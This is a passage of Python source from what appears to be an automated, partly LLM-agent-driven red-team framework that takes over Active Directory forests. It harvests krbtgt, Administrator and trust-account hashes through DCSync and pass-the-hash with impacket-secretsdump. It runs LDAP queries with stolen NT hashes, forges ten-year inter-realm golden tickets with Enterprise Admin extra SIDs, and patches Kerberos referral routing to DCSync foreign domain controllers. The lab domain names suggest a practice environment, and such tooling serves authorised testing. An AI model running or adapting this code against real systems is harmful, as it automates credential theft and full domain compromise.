                                            )
                                            ta_aes = re.search(
                                                rf"{re.escape(ta)}:"
                                                rf"aes256-cts-hmac-"
                                                rf"sha1-96:"
                                                rf"([a-fA-F0-9]+)",
                                                parent_output,
                                            )
                                            if th:
                                                t_aes_val = ta_aes.group(1) if ta_aes else ""
                                                logger.success(
                                                    f"🌲 Cross-forest "
                                                    f"trust key: {ta} "
                                                    f"from "
                                                    f"{parent_domain} "
                                                    f"(NTLM: "
                                                    f"{th.group(1)[:8]}"
                                                    f"..., AES: "
                                                    f"{'yes' if t_aes_val else 'no'})"
                                                )
                                                state.add_hash(
                                                    Hash(
                                                        username=ta,
                                                        domain=parent_domain,
                                                        hash_type="NTLM",
                                                        hash_value=th.group(1),
                                                        aes_key=t_aes_val,
                                                        source="auto_golden_ticket:parent_dcsync",
                                                    ),
                                                    "auto_golden_ticket",
                                                )
                                            else:
                                                logger.warning(
                                                    f"🌲 {ta} not found in parent DCSync"
                                                )

                                except Exception as escalation_err:
                                    logger.warning(
                                        f"🎫 Parent domain escalation failed: {escalation_err}"
                                    )

                                # Extract foreign domain SIDs from
                                # LDAP trust objects on the parent DC
                                # (where we have DA).
                                # This populates state.domain_sids so
                                # the trust extraction dispatch can
                                # include target_sid in the payload,
                                # avoiding cross-forest get_sid failure.
                                # Runs via run_tool on a worker pod
                                # using the impacket venv Python.
                                try:
                                    admin_hash_for_sid = None
                                    for h in state.all_hashes:
                                        if (
                                            h.username.lower() == "administrator"
                                            and h.domain
                                            and h.domain.lower() == parent_domain.lower()
                                            and (h.hash_type or "").upper() == "NTLM"
                                        ):
                                            admin_hash_for_sid = h.hash_value
                                            break

                                    sid_dc = None
                                    try:
                                        sid_dc = parent_dc_step2 or parent_dc_ip
                                    except NameError:
                                        sid_dc = parent_dc_ip

                                    # Refresh undominated in case
                                    # hosts were added since Step 1
                                    undominated = state.get_undominated_forests() or undominated
                                    if admin_hash_for_sid and sid_dc and undominated:
                                        parent_dn = ",".join(
                                            f"DC={p}" for p in parent_domain.split(".")
                                        )
                                        sid_py = (
                                            "import struct\n"
                                            "from impacket.ldap import"
                                            " ldap as ildap\n"
                                            "from impacket.ldap import"
                                            " ldapasn1 as la\n"
                                            "def s2s(b):\n"
                                            " r=b[0];n=b[1]\n"
                                            " a=int.from_bytes("
                                            "b[2:8],'big')\n"
                                            " s=[struct.unpack('<I',"
                                            "b[8+4*i:12+4*i])[0]"
                                            " for i in range(n)]\n"
                                            " return f'S-{r}-{a}-'"
                                            "+'-'.join(str(x)"
                                            " for x in s)\n"
                                            "try:\n"
                                            f" c=ildap.LDAPConnection("
                                            f"'ldap://{sid_dc}',"
                                            f"'{parent_dn}')\n"
                                            f" c.login("
                                            f"'Administrator','',"
                                            f"domain="
                                            f"'{parent_domain}',"
                                            f"nthash="
                                            f"'{admin_hash_for_sid}')\n"
                                            f" r=c.search("
                                            f"searchFilter="
                                            f"'(objectClass="
                                            f"trustedDomain)',"
                                            f"attributes=['trustPartner'"
                                            f",'securityIdentifier'],"
                                            f"searchBase="
                                            f"'CN=System,"
                                            f"{parent_dn}')\n"
                                            " for item in r:\n"
                                            "  if not isinstance("
                                            "item,la.SearchResultEntry"
                                            "):continue\n"
                                            "  p='';sid=''\n"
                                            "  for at in"
                                            " item['attributes']:\n"
                                            "   nm=str(at['type'])\n"
                                            "   vs=at['vals']\n"
                                            "   if nm=='trustPartner'"
                                            " and vs:p=str(vs[0])\n"
                                            "   elif nm=="
                                            "'securityIdentifier'"
                                            " and vs:\n"
                                            "    sid=s2s("
                                            "bytes(vs[0]))\n"
                                            "  if p and sid:\n"
                                            "   print("
                                            "f'TRUST:{p}:{sid}')\n"
                                            "except Exception as e:\n"
                                            " print(f'ERROR:{e}')\n"
                                        )
                                        sid_cmd = [
                                            "/opt/impacket/venv/bin/python",
                                            "-c",
                                            sid_py,
                                        ]
                                        sid_out, sid_err, _sid_rc = await _async_run_tool(
                                            sid_cmd, timeout_seconds=30
                                        )
                                        found_trust_sids = False
                                        for sid_line in (sid_out or "").splitlines():
                                            if sid_line.startswith("TRUST:"):
                                                parts = sid_line.split(":", 2)
                                                if len(parts) == 3:
                                                    trust_dns = parts[1].lower()
                                                    trust_sid_val = parts[2]
                                                    if (
                                                        trust_sid_val
                                                        and trust_sid_val.startswith("S-1-5-21-")
                                                        and trust_dns not in state.domain_sids
                                                    ):
                                                        state.domain_sids[trust_dns] = trust_sid_val
                                                        await backend.set_domain_sid(
                                                            trust_dns, trust_sid_val
                                                        )
                                                        logger.info(
                                                            f"🌲 Trust SID via LDAP: "
                                                            f"{trust_dns} → {trust_sid_val}"
                                                        )
                                                        found_trust_sids = True
                                        if not found_trust_sids:
                                            logger.warning(
                                                f"🌲 LDAP trust SID query returned no "
                                                f"foreign domain SIDs: "
                                                f"{(sid_out or '')[:300]} "
                                                f"{(sid_err or '')[:200]}"
                                            )
                                except Exception as sid_extract_err:
                                    logger.warning(
                                        f"🌲 Trust SID extraction via LDAP failed: "
                                        f"{sid_extract_err}"
                                    )

                                # Dispatch trust extraction for
                                # remaining forests — OUTSIDE the
                                # Step 1/2 try/except so it always
                                # runs even if hash parsing failed.
                                # Fix DC cache so dispatch uses the
                                # correct parent DC IP (may be
                                # swapped in GOAD).
                                try:
                                    # Update DC cache if Step 2
                                    # resolved the parent DC
                                    try:
                                        if parent_dc_step2:
                                            state.domain_controllers[parent_domain.lower()] = (
                                                parent_dc_step2
                                            )
                                    except NameError:
                                        pass  # Not set if escalation failed
                                    await dispatcher._auto_dispatch_trust_key_extraction(
                                        da_domain=parent_domain,
                                        da_username="Administrator",
                                        undominated_forests=state.get_undominated_forests(),
                                        source_agent="auto_golden_ticket",
                                    )
                                except Exception as trust_err:
                                    logger.warning(
                                        f"🎫 Trust extraction dispatch failed: {trust_err}"
                                    )

                        # Store ticket details in state (persisted to Redis!)
                        ticket_info = {
                            "domain": domain,
                            "ticket_path": ticket_path,
                            "domain_sid": domain_sid,
                            "krbtgt_hash": hash_obj.hash_value,
                            "created_at": datetime.now(timezone.utc).isoformat(),
                            "status": "success",
                        }
                        if parent_sid and parent_domain:
                            ticket_info["parent_domain"] = parent_domain
                            ticket_info["parent_sid"] = parent_sid
                            ticket_info["extra_sid"] = f"{parent_sid}-519"
                            ticket_info["enterprise_admin"] = "true"
                        state.add_golden_ticket(ticket_info)
                        # Update processed_domains to prevent duplicate attempts in this iteration
                        processed_domains.add(domain.lower())

                        # Add to state timeline
                        from ares.core.models import TimelineEvent

                        timeline_event = TimelineEvent(
                            id=f"golden-ticket-{domain.replace('.', '-')}",
                            timestamp=datetime.now(timezone.utc),
                            source="auto_golden_ticket",
                            description=f"Golden ticket generated for {domain} Administrator",
                            mitre_techniques=["T1558.001"],
                            confidence=1.0,
                        )
                        state.operation_timeline.append(timeline_event)

                        # Persist timeline event to Redis
                        timeline_backend: RedisStateBackend | None = getattr(
                            state, "_backend", None
                        )
                        if timeline_backend is not None:
                            event_dict = {
                                "id": timeline_event.id,
                                "timestamp": timeline_event.timestamp.isoformat(),
                                "description": timeline_event.description,
                                "evidence_ids": timeline_event.evidence_ids,
                                "mitre_techniques": timeline_event.mitre_techniques,
                                "confidence": timeline_event.confidence,
                                "source": timeline_event.source,
                            }
                            await timeline_backend.add_timeline_event(event_dict)

                        # Multi-forest mode: dispatch trust extraction after EVERY
                        # successful golden ticket, not just from the ExtraSid path.
                        # This ensures trust extraction fires for forest root domains
                        # (e.g., contoso.local) where ExtraSid doesn't apply,
                        # and serves as a safety net if the ExtraSid path's dispatch
                        # was skipped due to an exception in Step 1/2 processing.
                        if get_multi_forest_mode() and not state.all_forests_dominated():
                            _undom = state.get_undominated_forests()
                            if _undom:
                                # For child domains, dispatch from parent (forest root)
                                # since trust accounts (e.g., FABRIKAM$) live there
                                _dispatch_domain = domain
                                _dparts = domain.lower().split(".")
                                if len(_dparts) >= 3 and parent_domain:
                                    _dispatch_domain = parent_domain
                                try:
                                    await dispatcher._auto_dispatch_trust_key_extraction(
                                        da_domain=_dispatch_domain,
                                        da_username="Administrator",
                                        undominated_forests=_undom,
                                        source_agent="auto_golden_ticket",
                                    )
                                except Exception as _te:
                                    logger.warning(
                                        f"🌲 Post-golden-ticket trust "
                                        f"extraction dispatch failed: {_te}"
                                    )
                    else:
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
                        )
                        state.add_golden_ticket(
                            {
                                "domain": domain,
                                "ticket_path": None,
                                "created_at": datetime.now(timezone.utc).isoformat(),
                                "status": "failed_ticketer",
                                "error": output[:500],
                            }
                        )
                        # Update processed_domains to prevent duplicate attempts in this iteration
                        processed_domains.add(domain.lower())

                except Exception as e:
                    logger.warning(f"🎫 Auto-golden-ticket: Error generating ticket: {e}")
                    state.add_golden_ticket(
                        {
                            "domain": domain,
                            "ticket_path": None,
                            "created_at": datetime.now(timezone.utc).isoformat(),
                            "status": "failed_exception",
                            "error": str(e)[:500],
                        }
                    )
                    # Update processed_domains to prevent duplicate attempts in this iteration
                    processed_domains.add(domain.lower())

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto golden ticket error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_foreign_dcsync(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
) -> None:
    """
    Background task that auto-dispatches secretsdump against foreign (undominated) domains
    when credentials for those domains are available.

    This handles the case where:
    - Trust key extraction is dispatched but fails (e.g., inter-realm Kerberos broken)
    - But we have plaintext credentials for the foreign domain (e.g., password reuse,
      admin.user injected, or discovered via MSSQL links)

    When a credential for an undominated foreign domain exists AND we know the DC IP,
    this task runs secretsdump to extract krbtgt and Administrator hashes, achieving DA.
    """
    import re

    from ares.core.models import Hash

    logger.info("🌲 Auto-foreign-dcsync: background task started")

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            if state.completed:
                logger.info("🌲 Auto-foreign-dcsync: operation complete, stopping")
                break

            # Only relevant in multi-forest mode
            if not get_multi_forest_mode():
                logger.debug("🌲 Auto-foreign-dcsync: not in multi-forest mode, skipping")
                continue

            # Sync hosts/domains from Redis (picks up CLI inject-host data)
            await state.sync_hosts_and_domains_from_redis()

            # Sync domain_controllers and credentials from Redis
            has_tq = bool(dispatcher._task_queue)
            has_redis = bool(getattr(dispatcher._task_queue, "redis", None)) if has_tq else False
            if not has_tq or not has_redis:
                logger.warning(
                    f"🌲 Auto-foreign-dcsync: Redis not available "
                    f"(task_queue={has_tq}, redis={has_redis})"
                )
            if dispatcher._task_queue and dispatcher._task_queue.redis:
                try:
                    redis_client = dispatcher._task_queue.redis
                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
                    redis_dcs = await redis_client.hgetall(dc_key)
                    if redis_dcs:
                        for dc_domain, dc_ip_val in redis_dcs.items():
                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
                            ip = dc_ip_val if isinstance(dc_ip_val, str) else dc_ip_val.decode()
                            if d.lower() not in state.domain_controllers:
                                state.domain_controllers[d.lower()] = ip

                    from ares.core.state_backend import RedisStateBackend

                    backend = RedisStateBackend(redis_client, state.operation_id)
                    redis_creds = await backend.get_credentials()
                    for c in redis_creds:
                        existing_cred = next(
                            (
                                ex
                                for ex in state.all_credentials
                                if ex.username.lower() == c.username.lower()
                                and ex.domain.lower() == (c.domain or "").lower()
                            ),
                            None,
                        )
                        if existing_cred is None:
                            state.all_credentials.append(c)
                        elif c.is_admin and not existing_cred.is_admin:
                            # Update is_admin from Redis (e.g. inject --is-admin)
                            existing_cred.is_admin = True
                            logger.info(
                                f"🌲 Auto-foreign-dcsync: updated is_admin=True for "
                                f"{existing_cred.username}@{existing_cred.domain}"
                            )

                    # Sync hosts from Redis — critical for foreign domain discovery
                    # Hosts injected via CLI or discovered by agents may not be in
                    # in-memory state yet; add_host() also updates all_domains
                    redis_hosts = await backend.get_hosts()
                    for h in redis_hosts:
                        if not any(existing.ip == h.ip for existing in state.all_hosts):
                            state.add_host(h)
                            logger.info(
                                f"🌲 Auto-foreign-dcsync: synced host from Redis: "
                                f"{h.ip} ({h.hostname})"
                            )
                except Exception as sync_err:
                    logger.warning(f"🌲 Auto-foreign-dcsync: Redis sync error: {sync_err}")

            undominated = state.get_undominated_forests()
            if not undominated:
                # Don't break — foreign domains may be discovered later
                # (e.g., MSSQL links, trust enum, host injection)
                continue

            logger.info(
                f"🌲 Auto-foreign-dcsync: undominated={undominated}, "
                f"dcs={dict(state.domain_controllers)}, "
                f"creds_count={len(state.all_credentials)}"
            )

            # Look for credentials belonging to undominated foreign domains
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()

                # Find DC IP for this foreign domain
                dc_ip = state.domain_controllers.get(fd_lower)
                if not dc_ip:
                    # Try to find from hosts (check is_dc flag)
                    for host in state.all_hosts:
                        if host.is_dc and host.hostname:
                            h_domain = ".".join(host.hostname.lower().split(".")[1:])
                            if h_domain == fd_lower and host.ip:
                                dc_ip = host.ip
                                break
                if not dc_ip:
                    # Try ANY host in the foreign domain (may be DC even without flag)
                    for host in state.all_hosts:
                        if host.hostname and "." in host.hostname:
                            h_domain = host.hostname.lower().split(".", 1)[-1]
                            if h_domain == fd_lower and host.ip:
                                dc_ip = host.ip
                                logger.info(
                                    f"🌲 Auto-foreign-dcsync: using host {host.hostname} "
                                    f"({host.ip}) as potential DC for {foreign_domain}"
                                )
                                break
                if not dc_ip:
                    # DNS SRV fallback: resolve _ldap._tcp.<domain>
                    try:
                        srv_cmd = ["dig", "+short", f"_ldap._tcp.{fd_lower}", "SRV"]
                        srv_out, _, srv_rc = await _async_run_tool(srv_cmd, timeout_seconds=10)
                        if srv_rc == 0 and srv_out and srv_out.strip():
                            # SRV format: priority weight port target
                            for line in srv_out.strip().split("\n"):
                                parts = line.split()
                                if len(parts) >= 4:
                                    dc_hostname = parts[3].rstrip(".")
                                    # Resolve hostname to IP
                                    a_cmd = ["dig", "+short", dc_hostname, "A"]
                                    a_out, _, a_rc = await _async_run_tool(
                                        a_cmd, timeout_seconds=10
                                    )
                                    if a_rc == 0 and a_out and a_out.strip():
                                        dc_ip = a_out.strip().split("\n")[0]
                                        state.domain_controllers[fd_lower] = dc_ip
                                        # Also add as a host
                                        from ares.core.models import Host

                                        state.add_host(
                                            Host(
                                                ip=dc_ip,
                                                hostname=dc_hostname,
                                                is_dc=True,
                                            )
                                        )
                                        logger.info(
                                            f"🌲 Auto-foreign-dcsync: resolved DC for "
                                            f"{foreign_domain} via DNS SRV: "
                                            f"{dc_hostname} ({dc_ip})"
                                        )
                                        break
                    except Exception as dns_err:
                        logger.debug(
                            f"🌲 Auto-foreign-dcsync: DNS SRV lookup failed "
                            f"for {foreign_domain}: {dns_err}"
                        )
                if not dc_ip:
                    logger.info(f"🌲 Auto-foreign-dcsync: no DC IP for {foreign_domain}, skipping")
                    continue

                # Find credentials for this domain (plaintext or hash)
                for cred in state.all_credentials:
                    if not cred.domain or cred.domain.lower() != fd_lower:
                        continue
                    if not cred.password:
                        continue
                    if not _is_valid_secret_candidate(cred.password):
                        logger.debug(
                            f"🌲 Auto-foreign-dcsync: skipping invalid secret artifact for "
                            f"{cred.username}@{cred.domain}"
                        )
                        continue
                    if not _can_attempt_foreign_dcsync(state, cred.username, cred.domain):
                        logger.debug(
                            f"🌲 Auto-foreign-dcsync: skipping non-admin foreign credential "
                            f"{cred.username}@{cred.domain}"
                        )
                        continue

                    dedup_key = f"{fd_lower}:{dc_ip}:{cred.username.lower()}"
                    if dedup_key in state.processed_foreign_dcsync:
                        continue

                    logger.info(
                        f"🌲 Auto-foreign-dcsync: attempting secretsdump on "
                        f"{foreign_domain} DC {dc_ip} with "
                        f"{cred.username}@{cred.domain}"
                    )

                    # Full DCSync (no -just-dc-user to get everything)
                    cmd = [
                        "impacket-secretsdump",
                        f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
                        "-just-dc",
                    ]
                    stdout, stderr, rc = await _async_run_tool(cmd, timeout_seconds=300)
                    output = (stdout or "") + "\n" + (stderr or "")

                    logger.info(
                        f"🌲 Auto-foreign-dcsync: secretsdump on {dc_ip} with "
                        f"{cred.username}@{cred.domain} rc={rc}, "
                        f"output_len={len(output)}, "
                        f"first_200={output[:200]!r}"
                    )

                    if not output.strip():
                        logger.warning(
                            f"🌲 Auto-foreign-dcsync: empty output from secretsdump on {dc_ip}"
                        )
                        state.processed_foreign_dcsync.add(dedup_key)
                        continue

                    # Parse Administrator hash
                    admin_match = re.search(
                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                        output,
                    )
                    if admin_match:
                        logger.success(
                            f"🌲 Auto-foreign-dcsync: got Administrator hash for {foreign_domain}!"
                        )
                        state.add_hash(
                            Hash(
                                username="Administrator",
                                domain=foreign_domain,
                                hash_type="NTLM",
                                hash_value=admin_match.group(1),
                                source=f"auto_foreign_dcsync:{cred.username}@{cred.domain}",
                            ),
                            "auto_foreign_dcsync",
                        )
                        # Mark DA on this foreign domain
                        state.has_domain_admin = True
                        if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
                            state.domain_admin_domains.append(fd_lower)
                            logger.success(f"🌲🏆 DOMAIN ADMIN on foreign forest {foreign_domain}!")

                    # Parse krbtgt hash + AES
                    krbtgt_match = re.search(
                        r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                        output,
                    )
                    krbtgt_aes = re.search(
                        r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
                        output,
                    )
                    if krbtgt_match:
                        aes_val = krbtgt_aes.group(1) if krbtgt_aes else ""
                        logger.success(
                            f"🌲 Auto-foreign-dcsync: got krbtgt for "
                            f"{foreign_domain} (AES: {'yes' if aes_val else 'no'})"
                        )
                        state.add_hash(
                            Hash(
                                username="krbtgt",
                                domain=foreign_domain,
                                hash_type="NTLM",
                                hash_value=krbtgt_match.group(1),
                                aes_key=aes_val,
                                source=f"auto_foreign_dcsync:{cred.username}@{cred.domain}",
                            ),
                            "auto_foreign_dcsync",
                        )

                    # Always dedup after attempt (success or fail)
                    state.processed_foreign_dcsync.add(dedup_key)

                    if admin_match or krbtgt_match:
                        await dispatcher._checkpoint()

                        # Check if all forests now dominated
                        if state.all_forests_dominated():
                            logger.success("🌲🏆 ALL FORESTS DOMINATED via auto-foreign-dcsync!")
                            state.completed = True
                            await dispatcher._checkpoint()
                            return

                        # Got a result, don't try other creds for this domain
                        break

                # Also try hash-based auth for foreign domain.
                # Include hashes that either:
                # 1. Have domain matching the foreign domain (direct match)
                # 2. Are local Administrator hashes from foreign-domain hosts
                #    (local admin password reuse: sql01 → web01)
                foreign_host_ips = set()
                for host in state.all_hosts:
                    if host.hostname and "." in host.hostname:
                        h_domain = host.hostname.lower().split(".", 1)[-1]
                        if h_domain == fd_lower:
                            foreign_host_ips.add(host.ip)

                for hash_obj in state.all_hashes:
                    if hash_obj.username.lower() == "krbtgt":
                        continue  # krbtgt can't authenticate
                    if hash_obj.username.endswith("$"):
                        continue  # machine accounts can't PTH across forests
                    if (hash_obj.hash_type or "").upper() != "NTLM":
                        continue
                    if not _is_valid_secret_candidate(hash_obj.hash_value):
                        logger.debug(
                            f"🌲 Auto-foreign-dcsync: skipping invalid hash artifact for "
                            f"{hash_obj.username}@{hash_obj.domain}"
                        )
                        continue

                    # Check if this hash is relevant to the foreign domain
                    hash_domain = (hash_obj.domain or "").lower()
                    is_foreign_domain_hash = hash_domain == fd_lower

                    # Also check for local admin hashes from foreign domain hosts
                    # (secretsdump on sql01 yields Administrator with empty/NetBIOS domain)
                    is_local_admin_from_foreign = False
                    if hash_obj.username.lower() == "administrator" and hash_obj.source:
                        for fip in foreign_host_ips:
                            if fip in hash_obj.source:
                                is_local_admin_from_foreign = True
                                break

                    if not is_foreign_domain_hash and not is_local_admin_from_foreign:
                        continue

                    # For foreign domain hashes, check admin eligibility
                    # For local admin from foreign hosts, always try (password reuse)
                    if (
                        is_foreign_domain_hash
                        and not is_local_admin_from_foreign
                        and not _can_attempt_foreign_dcsync(
                            state, hash_obj.username, hash_obj.domain
                        )
                    ):
                        logger.debug(
                            f"🌲 Auto-foreign-dcsync: skipping non-admin foreign hash "
                            f"{hash_obj.username}@{hash_obj.domain}"
                        )
                        continue

                    dedup_key = f"{fd_lower}:{dc_ip}:{hash_obj.username.lower()}:pth"
                    if dedup_key in state.processed_foreign_dcsync:
                        continue

                    # Use the foreign domain for auth (not the hash's domain which
                    # may be empty or NetBIOS for local admin hashes from member servers)
                    auth_domain = hash_obj.domain if is_foreign_domain_hash else foreign_domain

                    logger.info(
                        f"🌲 Auto-foreign-dcsync: attempting PTH secretsdump on "
                        f"{foreign_domain} DC {dc_ip} with "
                        f"{hash_obj.username}@{auth_domain} (hash, "
                        f"{'local admin reuse' if is_local_admin_from_foreign else 'domain hash'})"
                    )

                    cmd = [
                        "impacket-secretsdump",
                        f"{auth_domain}/{hash_obj.username}@{dc_ip}",
                        "-hashes",
                        f"aad3b435b51404eeaad3b435b51404ee:{hash_obj.hash_value}",
                        "-just-dc",
                    ]
                    stdout, stderr, _rc = await _async_run_tool(cmd, timeout_seconds=300)
                    output = (stdout or "") + "\n" + (stderr or "")

                    admin_match = re.search(
                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                        output,
                    )
                    if admin_match:
                        logger.success(
                            f"🌲 Auto-foreign-dcsync (PTH): got Administrator "
                            f"hash for {foreign_domain}!"
                        )
                        state.add_hash(
                            Hash(
                                username="Administrator",
                                domain=foreign_domain,
                                hash_type="NTLM",
                                hash_value=admin_match.group(1),
                                source=f"auto_foreign_dcsync:pth:{hash_obj.username}@{hash_obj.domain}",
                            ),
                            "auto_foreign_dcsync",
                        )
                        state.has_domain_admin = True
                        if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
                            state.domain_admin_domains.append(fd_lower)
                            logger.success(
                                f"🌲🏆 DOMAIN ADMIN on foreign forest {foreign_domain} (via PTH)!"
                            )

                    krbtgt_match = re.search(
                        r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                        output,
                    )
                    krbtgt_aes = re.search(
                        r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
                        output,
                    )
                    if krbtgt_match:
                        aes_val = krbtgt_aes.group(1) if krbtgt_aes else ""
                        state.add_hash(
                            Hash(
                                username="krbtgt",
                                domain=foreign_domain,
                                hash_type="NTLM",
                                hash_value=krbtgt_match.group(1),
                                aes_key=aes_val,
                                source=f"auto_foreign_dcsync:pth:{hash_obj.username}@{hash_obj.domain}",
                            ),
                            "auto_foreign_dcsync",
                        )

                    # Always dedup after attempt (success or fail)
                    state.processed_foreign_dcsync.add(dedup_key)
                    if admin_match or krbtgt_match:
                        await dispatcher._checkpoint()
                        if state.all_forests_dominated():
                            logger.success(
                                "🌲🏆 ALL FORESTS DOMINATED via auto-foreign-dcsync (PTH)!"
                            )
                            state.completed = True
                            await dispatcher._checkpoint()
                            return
                        break

                # ── Phase 3: Inter-realm ticket forging via trust key ──
                import shlex

                # If we have a trust key hash (e.g. ESSOS$) for this foreign domain,
                # forge an inter-realm TGT and DCSync the foreign DC deterministically.
                # This bypasses the LLM agent entirely (which fails because
                # extract_trust_key doesn't support PTH and the task times out).
                target_nb = fd_lower.split(".")[0].upper()
                trust_account = f"{target_nb}$"

                # Find the trust key hash — stored under the SOURCE domain (e.g.
                # sevenkingdoms.local\ESSOS$), not the foreign domain itself.
                trust_hash = None
                for h in state.all_hashes:
                    if (
                        h.username.upper() == trust_account
                        and (h.hash_type or "").upper() == "NTLM"
                        and h.hash_value
                    ):
                        # hash_value may be "lm:nt" (65 chars) or just "nt" (32 chars)
                        nt_part = (
                            h.hash_value.split(":")[-1] if ":" in h.hash_value else h.hash_value
                        )
                        if len(nt_part) == 32:
                            trust_hash = h
                            break

                if not trust_hash:
                    continue

                dedup_key_ir = f"{fd_lower}:{dc_ip}:inter_realm_ticket"
                if dedup_key_ir in state.processed_foreign_dcsync:
                    continue

                # Need source domain SID for ticketer
                source_domain = (trust_hash.domain or "").lower()
                source_sid = state.domain_sids.get(source_domain, "")
                target_sid = state.domain_sids.get(fd_lower, "")

                if not source_sid:
                    logger.info(
                        f"🌲 Auto-foreign-dcsync: no source SID for {source_domain}, "
                        f"skipping inter-realm ticket for {foreign_domain}"
                    )
                    continue

                # Resolve DCs
                source_dc = state.domain_controllers.get(source_domain, "")
                if not source_dc:
                    continue

                logger.info(
                    f"🌲 Auto-foreign-dcsync: forging inter-realm ticket for {foreign_domain}\n"
                    f"   Trust key: {trust_account} from {source_domain}\n"
                    f"   Source DC: {source_dc}, Target DC: {dc_ip}\n"
                    f"   Source SID: {source_sid}, Target SID: {target_sid or '(unknown)'}\n"
                    f"   AES key: {'yes' if trust_hash.aes_key else 'no'}"
                )

                # Build ticketer command
                if trust_hash.aes_key:
                    key_args = f"-aesKey {trust_hash.aes_key}"
                else:
                    # Extract NT hash from potential "lm:nt" format
                    nt_hash = (
                        trust_hash.hash_value.split(":")[-1]
                        if ":" in trust_hash.hash_value
                        else trust_hash.hash_value
                    )
                    key_args = f"-nthash {nt_hash}"

                extra_sid_arg = ""
                if target_sid:
                    extra_sid_arg = f"-extra-sid {target_sid}-519"

                ticketer_cmd = (
                    f"impacket-ticketer {key_args} "
                    f"-domain-sid {source_sid} "
                    f"-domain {source_domain} "
                    f"{extra_sid_arg} "
                    f"-spn krbtgt/{fd_lower} "
                    f"-duration 3650 Administrator"
                )

                # Build DCSync targets
                dcsync_targets = [
                    f"{target_nb}\\Administrator",
                    f"{target_nb}\\krbtgt",
                ]
                targets_str = ",".join(dcsync_targets)

                # Resolve foreign DC FQDN for secretsdump target string
                foreign_fqdn = fd_lower
                for host in state.all_hosts:
                    if host.ip == dc_ip and host.hostname and "." in host.hostname:
                        foreign_fqdn = host.hostname.lower()
                        break

                # Python script with referral routing patch (same pattern as Step 2)
                dcsync_py = (
                    "import os,sys,re,runpy,shutil\n"
                    "from impacket.krb5 import kerberosv5\n"
                    "_oSR=kerberosv5.sendReceive\n"
                    f'SD="{source_domain.upper()}"\n'
                    f'TD="{fd_lower.upper()}"\n'
                    f'SDC="{source_dc}"\n'
                    f'TDC="{dc_ip}"\n'
                    f'TF="{foreign_fqdn}"\n'
                    "DKM={SD:SDC,TD:TDC}\n"
                    "def _pSR(d,dom,kdc=None):\n"
                    "  m=DKM.get(dom.upper())\n"
                    "  if m:\n"
                    "    try:\n"
                    "      return _oSR(d,dom,m)\n"
                    "    except Exception as e1:\n"
                    "      print(f'KDC {m} failed for {dom}: {e1}')\n"
                    "      for a in set(DKM.values()):\n"
                    "        if a!=m:\n"
                    "          try:return _oSR(d,dom,a)\n"
                    "          except:pass\n"
                    "      raise\n"
                    "  return _oSR(d,dom,kdc)\n"
                    "kerberosv5.sendReceive=_pSR\n"
                    "os.environ['KRB5CCNAME']='Administrator.ccache'\n"
                    "w=shutil.which('impacket-secretsdump')\n"
                    "sd=None\n"
                    "if w:\n"
                    "  with open(w) as f:\n"
                    "    c=f.read()\n"
                    '  m=re.search(r\'"([^"]*secretsdump\\.py)"\',c)\n'
                    "  if m:sd=m.group(1)\n"
                    "  elif c.startswith('#!/usr/bin/env python'):\n"
                    "    sd=w\n"
                    "if not sd:\n"
                    "  sd='/opt/impacket/examples/secretsdump.py'\n"
                    "print(f'using {sd}')\n"
                    f'TARGETS="{targets_str}"\n'
                    "for usr in TARGETS.split(','):\n"
                    "  try:\n"
                    "    sys.argv=['secretsdump','-k','-no-pass',"
                    "'-just-dc-user',usr,'-just-dc-ntlm',"
                    "'-target-ip',TDC,'-dc-ip',SDC,"
                    "SD+'/Administrator@'+TF]\n"
                    "    print(f'DCSync {usr} via {TF}')\n"
                    "    runpy.run_path(sd,run_name='__main__')\n"
                    "  except SystemExit:pass\n"
                    "  except Exception as e:\n"
                    "    print(f'DCSync {usr}: {e}')\n"
                )
                dcsync_cmd = f"python3 -c {shlex.quote(dcsync_py)}"

                ir_bash = f"{ticketer_cmd} && {dcsync_cmd}"
                ir_cmd = ["bash", "-c", ir_bash]

                logger.info(
                    f"🌲 Auto-foreign-dcsync: inter-realm DCSync "
                    f"{foreign_domain} via {foreign_fqdn}"
                )

                ir_stdout, ir_stderr, ir_rc = await _async_run_tool(ir_cmd, timeout_seconds=600)
                ir_output = (ir_stdout or "") + "\n" + (ir_stderr or "")

                logger.info(
                    f"🌲 Auto-foreign-dcsync: inter-realm result rc={ir_rc}, "
                    f"output_len={len(ir_output)}, first_300={ir_output[:300]!r}"
                )

                state.processed_foreign_dcsync.add(dedup_key_ir)

                # Parse results
                ir_admin = re.search(
                    r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                    ir_output,
                )
                ir_krbtgt = re.search(
                    r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
                    ir_output,
                )
                ir_krbtgt_aes = re.search(
                    r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
                    ir_output,
                )

                if ir_admin:
                    logger.success(
                        f"🌲 Auto-foreign-dcsync (inter-realm): "
                        f"got Administrator hash for {foreign_domain}!"
                    )
                    state.add_hash(
                        Hash(
                            username="Administrator",
                            domain=foreign_domain,
                            hash_type="NTLM",
                            hash_value=ir_admin.group(1),
                            source=f"auto_foreign_dcsync:inter_realm:{trust_account}",
                        ),
                        "auto_foreign_dcsync",
                    )
                    state.has_domain_admin = True
                    if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
                        state.domain_admin_domains.append(fd_lower)
                        logger.success(
                            f"🌲🏆 DOMAIN ADMIN on foreign forest "
